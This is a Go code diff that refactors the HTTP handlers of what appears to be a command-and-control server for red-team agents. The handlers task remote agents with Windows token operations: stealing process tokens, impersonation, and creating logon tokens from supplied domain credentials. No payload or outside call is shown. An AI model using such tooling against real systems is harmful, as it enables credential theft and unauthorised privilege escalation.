@@ -105,14 +105,8 @@ func (s *Server) handleGlobalTokensPage(c *gin.Context) {
 // handleTokenListProcs dispatches token_list_procs task to agent
 func (s *Server) handleTokenListProcs(c *gin.Context) {
 	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "token_list_procs", "", "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("token_list_procs: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_list_procs"})
+	if task == nil {
 		return
 	}
 
@@ -136,14 +130,8 @@ func (s *Server) handleTokenSteal(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "token_steal", pidStr, "", processName, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("token_steal: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_steal", Command: pidStr, Path: processName})
+	if task == nil {
 		return
 	}
 
@@ -169,15 +157,9 @@ func (s *Server) handleTokenMake(c *gin.Context) {
 		logonType = "interactive"
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
 	// Command = user, Shell = password (needed by agent for LogonUser), Path = logon_type
-	task, err := s.createTask(id, "token_make", domUser, password, logonType, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("token_make: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_make", Command: domUser, Shell: password, Path: logonType})
+	if task == nil {
 		return
 	}
 
@@ -191,14 +173,8 @@ func (s *Server) handleTokenMake(c *gin.Context) {
 // POST /agents/:id/token/revert
 func (s *Server) handleTokenRevert(c *gin.Context) {
 	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "token_revert", "", "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("token_revert: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_revert"})
+	if task == nil {
 		return
 	}
 
@@ -216,13 +192,8 @@ func (s *Server) handleTokenRevert(c *gin.Context) {
 // handleTokenWhoami dispatches token_whoami
 func (s *Server) handleTokenWhoami(c *gin.Context) {
 	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "token_whoami", "", "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_whoami"})
+	if task == nil {
 		return
 	}
 
@@ -277,14 +248,9 @@ func (s *Server) handleTokenImpersonate(c *gin.Context) {
 		return
 	}
 
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
 	// Re-steal the same pid
-	task, err := s.createTask(id, "token_steal", fmt.Sprintf("%d", entry.PID), "", entry.ProcessName, "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "token_steal", Command: fmt.Sprintf("%d", entry.PID), Path: entry.ProcessName})
+	if task == nil {
 		return
 	}
 
